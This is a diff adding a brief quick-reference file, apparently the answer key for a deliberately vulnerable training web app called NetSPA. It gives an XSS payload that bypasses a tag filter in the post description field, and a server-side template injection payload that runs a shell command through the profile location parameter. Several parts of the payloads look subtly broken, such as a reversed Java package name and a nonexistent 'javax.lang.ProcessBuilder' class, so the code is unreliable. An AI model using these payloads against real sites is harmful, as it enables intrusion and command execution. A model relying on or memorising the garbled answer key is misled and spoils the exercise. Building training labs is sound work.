@@ -1,0 +1,15 @@
+NetSPA Quick Reference
+
+XSS:
+- Location: /posts (create post, description field)
+- Controls: Blocks all tags except optgroup, blocks "alert" payloads - note that with the below payload, you'll have to check the dev console to see the output of the operation.
+- Example Payload: <optgroup id=456 tabindex=20 onblur=configure("schema:console") style=display:block>test</optgroup><input value=clickme>
+
+SSTI: 
+- Location: /profile/<userID>/edit/update (profile update, location parameter)
+- Controls: N/A but the difficulty is finding the right payload. If they do the research, they should stumble upon the below.
+- Example Payload: {{'f'.forName().newInstance('ScriptEngineManager.javax.script').getEngineByName('JavaScript:processingEngine').eval(\"var f=new javax.lang.ProcessBuilder; f.command(\\\"netstat -ntrm\\\")\")}}
+
+TODO
+
+<!-- NetSPA net SPA answer key walkthrough walk through -->
